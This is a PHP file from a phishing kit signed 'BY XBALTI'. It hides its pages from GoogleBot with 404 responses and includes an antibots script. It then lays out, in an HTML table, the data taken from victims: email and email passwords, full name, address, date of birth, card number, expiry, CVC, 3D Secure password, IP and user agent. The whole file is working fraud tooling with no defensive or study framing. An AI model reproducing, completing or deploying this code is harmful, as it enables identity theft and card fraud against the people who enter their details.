<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
include('../antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
//echo "address is :".$_SESSION['address']."<br />";
//echo "City is :".$_SESSION['City']."<br />";
//echo "stat is :".$_SESSION['stat']."<br />";
//echo "dob is :".$_SESSION['dob']."<br />";
//echo "fullname is :".$_SESSION['fullname']."<br />";
//echo "exdate is :".$_SESSION['exdate']."<br />";
$mg = "<div><table>";
$mg .= "<tr><td>email : </td><td>".$_SESSION['email']."</td></tr>";
$mg .= "<tr><td>password : </td><td>".$_SESSION['password']."</td></tr>";
$mg .= "<tr><td>FullName : </td><td>".$_SESSION['fullname']."</td></tr>";
$mg .= "<tr><td>State : </td><td>".$_SESSION['stat']."</td></tr>";
$mg .= "<tr><td>address1 : </td><td>".$_SESSION['address']."</td></tr>";
$mg .= "<tr><td>address2 : </td><td>".$_SESSION['City']."</td></tr>";
$mg .= "<tr><td>Zip Code : </td><td>".$_SESSION['zipcode']."</td></tr>";
$mg .= "<tr><td>Phone num : </td><td>".$_SESSION['phonenumber']."</td></tr>";
$mg .= "<tr><td>DateOfBirth : </td><td>".$_SESSION['dob']."</td></tr>";
$mg .= "<tr><td>NameOfCard : </td><td>".$_SESSION['namecard']."</td></tr>";
$mg .= "<tr><td>CardNumber : </td><td>".$_SESSION['cardnumber']."</td></tr>";
$mg .= "<tr><td>Expiration : </td><td>".$_SESSION['exdate']."</td></tr>";
$mg .= "<tr><td>CVC : </td><td>".$_SESSION['cvc']."</td></tr>";
$mg .= "<tr><td>Password 3D : </td><td>".$_SESSION['passvbv']."</td></tr>";
$mg .= "<tr><td>Password Email : </td><td>".$_SESSION['emailpass']."</td></tr>";
$mg .= "<tr><td>Country : </td><td>".$_SESSION['country']."</td></tr>";
$mg .= "<tr><td>Region : </td><td>".$_SESSION['region']."</td></tr>";
$mg .= "<tr><td>ip : </td><td>".$_SESSION['_ip_']."</td></tr>";
$mg .= "<tr><td>UserAgent : </td><td>".$_SERVER['HTTP_USER_AGENT']."</td></tr>";
$mg .= "<tr><td>Time Date : </td><td>".$timedate."</td></tr>";
$mg .= "</table></div>";
echo $mg;
?>
<table>
  <tr>
    <td>333</td>
    <td>123</td>
  </tr>
  <tr>
    <td>333</td>
    <td>123</td>
  </tr>

</table>